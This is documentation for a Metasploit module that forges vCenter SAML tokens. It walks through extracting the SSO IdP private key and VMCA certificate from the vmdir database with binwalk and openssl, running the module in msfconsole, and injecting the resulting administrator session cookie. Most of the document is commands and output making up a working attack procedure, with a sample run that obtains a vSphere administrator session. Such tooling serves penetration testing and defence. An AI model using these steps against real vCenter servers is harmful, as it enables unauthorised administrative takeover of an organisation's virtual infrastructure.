This module forges valid SAML credentials for vCenter server using the vCenter SSO IdP certificate,
IdP private key, and VMCA root certificate as input objects; you must also  provide the vCenter SSO
domain name and vCenter FQDN. Successful execution returns a session cookie for the `/ui` path that
grants access to the SSO domain as a vSphere administrator. The IdP trusted certificate chain can be
retrieved using Metasploit vCenter post-exploitation modules, or extracted manually from the vmdir
database file at `/storage/db/vmware-vmdir/data.mdb` using `binwalk`. This module is largely based
on information published by Zach Hanley at Horizon3:

https://www.horizon3.ai/compromising-vcenter-via-saml-certificates/

## Vulnerable Application
This module is tested against the vCenter appliance but will probably work against Windows instances.
It has been tested against vCenter appliance versions 6.5, 6.7, and 7.0, and will work on vCenter 7.0
Update 3 which introduced additional validation mechanisms to the SSO login process (RelayState). It
will probably work against other versions of vCenter appliance down to vCenter 6.0 but has not been
tested at versions below 6.5.

## Verification Steps
This module must be executed while the target vCenter server is reachable over the network. You must
already possess the SSO IdP certificate and key, and the VMCA certificate. These can be acquired by
using a Metasploit vCenter post-exploitation module (with access to a live system with root creds)
or by extracting the data manually from the vmdir database file using binwalk (with access to a
vCenter backup). By default, the target domain `vsphere.local` and target username `administrator`
are used; the target domain may be different depending on the scenario and should be adjusted
accordingly.

1. Acquire the vCenter IdP certificate and private key, and VMCA certificate (see below)
2. Start msfconsole
3. Do: `use auxiliary/admin/vmware/vcenter_forge_saml_token.rb`
4. Do: `set rhosts <vCenter appliance IPv4 or FQDN>`
5. Do: `set vhost <vCenter appliance FQDN>`
6. Do: `set vc_idp_cert <path to IdP cert>`
7. Do: `set vc_idp_key <path to IdP key>`
8. Do: `set vc_vmca_cert <path to VMCA cert>`
9. Verify that the values for `domain` and `username` are sane
10. Do: `run`
11. Open a web browser and navigate to the vCenter admin UI for the target server (`https://<vcenterfqdn>/ui`)
12. Apply the acquired session cookie for the vCenter host at the `/ui` path

## Options
**DOMAIN**

The vSphere SSO domain; by default this is `vsphere.local`. If this does not match the vSphere SSO
domain, the module will return `HTTP 400: Issuer not trusted` on execution.

**USERNAME**

The target user within the SSO domain. This must be a valid user as vCenter will happily issue
SAML assertions for invalid usernames, but the provided session tokens will not function. There
should be no reason to modify the target user from the default `administrator` in most scenarios.

**RHOSTS**

The vCenter appliance IPv4 address or DNS FQDN. This must be reachable over HTTPS for the module
to function.

**VHOST**

The fully qualified DNS name of the vCenter appliance; this must be present in the Issuer element
of the assertion for the module to function. If this value does not match the vCenter appliance
FQDN, the module will return `HTTP 400` during the initial `GET` request.

**VC_IDP_CERT**

The filesystem path to the vCenter SSO IdP certificate in DER or PEM format.

**VC_IDP_KEY**

The filesystem path to the vCenter SSO IdP private key in DER or PEM format.

**VC_VMCA_CERT**

The filesystem path to the vCenter VMCA certificate in DER or PEM format.

## Advanced Options

**VC_IDP_TOKEN_BEFORE_SKEW**

Number of seconds to subtract when preparing the assertion validity start time. Valid values are between
`300` (five minutes) and `2592000` (30 days); default is `2592000`.

**VC_IDP_TOKEN_AFTER_SKEW**

Number of seconds to add when preparing the assertion validity end time. Valid values are between
`300` (five minutes) and `2592000` (30 days); default is `2592000`.

## Scenarios
### Extracting the vSphere SSO certificates
The vmdir database is hosted on the appliance at `/storage/db/vmware-vmdir/data.mdb` - it is possible
to extract the IdP keys from this file presuming you have root access to the appliance, or read access
to a vCenter backup repository. Copy the file to the local system, and use binwalk to scan for the
private key material.

`binwalk --signature ./data.mdb`

vSphere vmdir stores the IdP secrets without encryption within the database. There are many x509
certificates within the vmdir database but there should only be two private keys; you are looking for
two x509 v3 certificates in close proximity to two PKCS#1 RSA private keys in DER format. Below is an
example of the target location from a binwalk signature scan of an example vmdir database.

```
[...]
8839882       0x86E2CA        Certificate in DER format (x509 v3), header length: 4, sequence length: 991
8840880       0x86E6B0        Certificate in DER format (x509 v3), header length: 4, sequence length: 1079
8841970       0x86EAF2        Private key in DER format (PKCS header length: 4, sequence length: 1215
8841996       0x86EB0C        Private key in DER format (PKCS header length: 4, sequence length: 1189
[...]
```

The target data starts at offset `8839882` in this example. Adding the sequence lengths together we get `4474` bytes, thus:

`binwalk --offset=8839882 --length=4474 --dd=".*" ./data.mdb`

Will extract the target files.

```
DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
8839882       0x86E2CA        Certificate in DER format (x509 v3), header length: 4, sequence length: 991
8840880       0x86E6B0        Certificate in DER format (x509 v3), header length: 4, sequence length: 1079
8841970       0x86EAF2        Private key in DER format (PKCS header length: 4, sequence length: 1215
8841996       0x86EB0C        Private key in DER format (PKCS header length: 4, sequence length: 1189

$ ls -l ./_data.mdb.extracted/
total 16
-rwxrwxrwx 1 cs137 cs137  995 Apr 21 06:55 86E2CA
-rwxrwxrwx 1 cs137 cs137 1083 Apr 21 06:55 86E6B0
-rwxrwxrwx 1 cs137 cs137 1219 Apr 21 06:55 86EAF2
-rwxrwxrwx 1 cs137 cs137 1193 Apr 21 06:55 86EB0C
```

These should be the VMCA root certificate and SSO IdP certificate and private key. Note that vmdir appears to store two
copies of the IdP private key, presumably to allow the key to be rotated if required. For a vanilla install of vCenter,
both private keys will be identical. To determine which one is which, first compare the certificate CN using OpenSSL. The
SSO IdP credential should have a common name of `ssoserverSign`.

```
openssl x509 -inform der -in ./_data.mdb.extracted/86E2CA -noout -subject
subject=CN = ssoserverSign

openssl x509 -inform der -in ./_data.mdb.extracted/86E6B0 -noout -subject
subject=CN = CA, DC = vsphere.local, C = US, ST = California, O = vcenter.cesium137.io, OU = VMware Engineering
```

This confirms that `86E2CA` is the IdP certificate, and `86E6B0` is the VMCA certificate. Convert them
to PEM format and rename them for convenience:

```
openssl x509 -inform der -in ./_data.mdb.extracted/86E2CA -outform pem -out ./idp.pem
openssl x509 -inform der -in ./_data.mdb.extracted/86E6B0 -outform pem -out ./vmca.pem
```

To associate  them with their private key, first calculate the SHA-256 digest of the modulus for
both certificates.

```
openssl x509 -in ./idp.pem -modulus -noout | sha256sum
482a9fcb97dfd29b8478c51b394cce8463f04038cdc507957b8a1ee5a99ccb32  -

openssl x509 -in ./vmca.pem -modulus -noout | sha256sum
432f0244896a3243f46d4a2f7322127a52b891a53b984745c286989c02862a13  -
```

Compare these to the modulus component of the candidate keys to associate them with the corresponding
certificate.

```
openssl rsa -inform der -in ./_data.mdb.extracted/86EAF2 -modulus -noout | sha256sum
482a9fcb97dfd29b8478c51b394cce8463f04038cdc507957b8a1ee5a99ccb32  -

openssl rsa -inform der -in ./_data.mdb.extracted/86EB0C -modulus -noout | sha256sum
482a9fcb97dfd29b8478c51b394cce8463f04038cdc507957b8a1ee5a99ccb32  -
```

Based on this output we conclude `86EAF2` and `86EB0C` are identical, and share a modulus with the
IdP certificate: either of these can be extracted. Convert the file to PEM format and rename it for
convenience.

```
openssl rsa -inform der -in ./_data.mdb.extracted/86EAF2 -outform pem -out ./idp.key
writing RSA key
```

You should now have `idp.pem`, `idp.key`, and `vmca.pem` in your working directory in PEM format.

### Running the Module
Example run against vCenter appliance version 7.0 Update 3d:

```
msf6 > use auxiliary/admin/vmware/vcenter_forge_saml_token.rb
msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set RHOSTS 192.168.100.110
RHOSTS => 192.168.100.110
msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VHOST vcenter.cesium137.io
VHOST => vcenter.cesium137.io
msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_IDP_CERT ~/idp.pem
VC_IDP_CERT => ~/idp.pem
msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_IDP_KEY ~/idp.key
VC_IDP_KEY => ~/idp.key
msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > set VC_VMCA_CERT ~/vmca.pem
VC_VMCA_CERT => ~/vmca.pem
msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) > run
[*] Running module against 192.168.100.110

[+] Validated vCenter Single Sign-On IdP trusted certificate chain
[*] HTTP GET => /ui/login ...
[*] HTTP POST => /ui/saml/websso/sso ...
[*] Got cookie: VSPHERE-CLIENT-SESSION-INDEX=_ad4a6b68b157bded0de5ec6ce2cab324
[*] Got cookie: VSPHERE-UI-JSESSIONID=DA9ECA61A289E32D31D9926D0CD433C1
[*] Got cookie: VSPHERE-USERNAME=administrator%40vsphere.local
[+] Got valid administrator session token!
[+]     JSESSIONID=DA9ECA61A289E32D31D9926D0CD433C1; Path=/ui
[*] Auxiliary module execution completed
msf6 auxiliary(admin/vmware/vcenter_forge_saml_token) >
```
### Using the Session Cookie
Inject the acquired session cookie using the method of your choice. The cookie name must be
`JSESSIONID` with the value returned from the auxiliary module, and the path for the cookie
must be set to `/ui`.